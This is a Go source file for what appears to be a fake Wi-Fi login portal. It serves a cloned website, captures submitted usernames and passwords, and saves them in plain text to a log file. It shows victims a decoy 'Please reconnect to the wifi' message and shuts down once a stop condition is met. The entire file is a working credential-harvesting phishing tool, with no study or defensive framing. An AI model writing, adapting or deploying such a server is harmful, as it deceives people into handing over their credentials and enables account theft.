package serve

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"sync"

	"../build"
)

const _successMsg = "Hotspot full. Try again later."
const successMsg = "Please reconnect to the wifi." //`<script>window.location="%s"</script>`
const msg404 = "404 Not Found."

var fileIoMutex sync.Mutex

//Serve serves the specified folder.
func Serve(website build.Website, port uint) {

	addr := ":" + fmt.Sprint(port)
	log.Printf("Serving on %s", addr)

	_logfile := website.WebsiteName + ".log"
	_server := &http.Server{
		Addr: addr,
	}

	logFile, err := os.OpenFile(_logfile,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer logFile.Close()

	if err != nil {
		log.Fatal(err)
	}

	http.HandleFunc("/",
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, website.IndexFile)
		})

	http.HandleFunc("/login/",
		func(w http.ResponseWriter, r *http.Request) {
			stop := handleLogin(website, logFile, w, r)

			if stop {

				// NOTE (bcovas): Without a separate routine,
				// the success msg does not seem to be written.
				log.Print("Shut down.")
				go _server.Shutdown(nil)
			}
		})

	http.HandleFunc(website.ResHandleMatch,
		func(w http.ResponseWriter, r *http.Request) {
			serveFile(w, r, r.URL.Path[1:])
		})

	err = _server.ListenAndServe()
	if err != http.ErrServerClosed {
		log.Fatal(err)
	}
}

func handleLogin(
	web build.Website,
	logFile *os.File,
	w http.ResponseWriter,
	r *http.Request) bool {

	if r.Method != "POST" {
		fmt.Fprintln(w, msg404)
		return false
	}

	body, err := ioutil.ReadAll(r.Body)

	if err != nil {
		fmt.Fprintln(w, msg404)
		log.Print(err)
		return false
	}

	values, err := url.ParseQuery(string(body))

	if err != nil {
		log.Print(err)
		return false
	}

	if len(values["user"]) != 1 || len(values["pass"]) != 1 {
		log.Println("Wrong request.")
		log.Println(values["user"])
		log.Println(values["pass"])
		return false
	}

	user := values["user"][0]
	pass := values["pass"][0]

	valid := web.IsValid(user, pass)

	if !valid {
		serveFile(w, r, web.InvalidFile)
		return false
	}

	fmt.Fprintln(w, successMsg)

	fileIoMutex.Lock()
	log.Printf("Saving User: %s, Pass: %s", user, pass)
	fmt.Fprintf(logFile, "user: %s | pass: %s \n", user, pass)
	fileIoMutex.Unlock()

	log.Printf("Executing ShouldStop")
	stop := web.ShouldStop(user, pass)
	log.Printf("Sould stop returned: %t", stop)

	return stop
}

func serveFile(
	w http.ResponseWriter,
	r *http.Request,
	filename string) error {

	log.Printf(
		"%s wanted %s and got %s.",
		r.RemoteAddr,
		r.URL,
		filename)

	http.ServeFile(w, r, filename)
	return nil
}
